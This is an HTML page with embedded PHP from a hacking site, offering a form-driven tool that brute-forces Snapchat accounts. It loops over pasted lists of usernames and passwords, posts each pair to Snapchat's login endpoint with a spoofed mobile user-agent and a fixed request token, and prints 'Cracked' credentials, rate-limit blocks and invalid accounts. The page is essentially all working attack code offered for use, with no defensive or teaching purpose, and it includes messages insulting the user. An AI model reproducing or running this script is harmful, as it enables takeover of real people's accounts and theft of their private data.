<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>1337Leaks * Login API Snapchat</title>
<meta name="title" content="1337Leaks, Leaks, WikiLeaks, 1337r00t, تسريبات, تسريب, تهكير, ثغرات, اختراق, Hacker, Exploits, exploit, Vulnerability" />
<meta name="description" content="1337Leaks, Leaks, WikiLeaks, 1337r00t, تسريبات, تسريب, تهكير, ثغرات, اختراق, Hacker, Exploits, exploit, Vulnerability" />
<meta name="keywords" content="1337Leaks, Leaks, WikiLeaks, 1337r00t, تسريبات, تسريب, تهكير, ثغرات, اختراق, Hacker, Exploits, exploit, Vulnerability" />
<meta name="author" content="1337Leaks.info" />
<meta name="owner" content="1337Leaks.info" />
<link rel="shortcut icon" href="http://static.deathandtaxesmag.com/uploads/2012/06/biohazard-sharps-container.png" />
<link type="text/css" rel="stylesheet" href="http://1337leaks.info/style.css">
<body dir="ltr" alink="#00ff00" background="http://1337leaks.info/point.gif" bgcolor="#000000" link="#00c000" text="#008000" vlink="#00c000">
</head>
<body>
<center>
<table width="668" border="0" cellpadding="3" cellspacing="3" class="main">
  <tr><td></td></tr><tr><td>
<table width="597" align="center" border="0">
<tbody>
<a href="https://github.com/1337r00t/SnapBrute/"><font color="yellow">[Source Code(Brute Force)]</font></a><br><br>
<form action="" method="post">
<br>
<img src="http://www.covetedplaces.com/wp-content/uploads/2015/11/snapchat-logo-yellow.png" width="120" height="120"><br>
<font color="yellow">BruteForce SnapChat API</font><br><br>
<font color="red"><textarea placeholder="Usernames" name="users" cols="10" rows="10"></textarea></font><font color="black">-------</font>
<font color="red"><textarea placeholder="Passwords" name="passs" cols="10" rows="10"></textarea></font><br><br>
<input type="submit" name="login" value="Login">
</form>
<br><br><br>
<?
function base64($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}
if($_POST['login']){
	if($_POST['users']){
		if($_POST['passs']){
				$users = explode("\r\n", htmlentities($_POST['users']));
				$passs = explode("\r\n", htmlentities($_POST['passs']));
				foreach($users as $username)
				{
				foreach($passs as $password)
				{
					$snapchat = curl_init();
					curl_setopt($snapchat, CURLOPT_URL, "https://app.snapchat.com/loq/login");
					curl_setopt($snapchat, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($snapchat, CURLOPT_FOLLOWLOCATION, false);
					curl_setopt($snapchat, CURLOPT_HTTPHEADER, array(
						'Accept-Language: en;q=0.9',
						'User-Agent: Snapchat/8.8.0.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)'
					));
					curl_setopt($snapchat, CURLOPT_POSTFIELDS, "password=${password}&req_token=9304d151ced17c086eed4ae4ffa57304c7e64d821980ca8b69b43b14ddc5188b&timestamp=1509567052943&username=${username}");
					$response = curl_exec($snapchat);
					if(eregi('Thanks!', $response)){
						echo "<br><font color='blue'>Cracked -> (".htmlspecialchars($username).":".htmlspecialchars($password).")</font><br>";
					}
					else
					{
						if(eregi('password is incorrect', $response)){
							echo "<br><font color='red'>Failed -> (".htmlspecialchars($username).":".htmlspecialchars($password).")</font><br>";
						}
						else
						{
							if(eregi('failed login attempts', $response)){
								echo "<br><font color='pink'>Blocked :( [Your IP -> (".$_SERVER['REMOTE_ADDR'].")]</font><br>";
							}
							else
							{
								if(eregi('Invalid account', $response)){
									echo "<br><font color='orange'>Invalid account -> (".htmlspecialchars($username).")</font><br>";
								}
								else
								{
									echo "<br><font color='pink'>Blocked :( [Your IP -> (".$_SERVER['REMOTE_ADDR'].")]</font><br>";
								}
							}
						}
					}
				}
				}
		}
		else
		{
			echo "<br><br><font color='pink'>حط باسورد لاترفع ضغطي </font>";
		}
	}
	else
	{
		echo "<br><br><font color='pink'>يعني الحين نسويلك سكربت ونتعب نسويه واخرتها تترك خانة اليوزر فاضية !! حمار انت </font>";
	}
}
?>
</tbody>
</table>
<br><b>
<h4><font color="yellow">Coded With Love 1337r00t</font></h4>
<p><FONT style="FONT-SIZE: 10px; FONT-FAMILY: 'courier new'">Email <a href="mailto:leetroot@hotmail.com">1337r00t@1337leaks.info</a> 
<br><br>Copyright &copy; 2017 <a href="http://1337Leaks.info">1337Leaks.info</a> - <a href="http://1337r00t.com">1337r00t</a> -  <a href="http://twitter.com/_1337r00t">My Twitter</a> </FONT></p>
</td></tr></table>
  <br>
  <br>
</center>
</body>
</html>
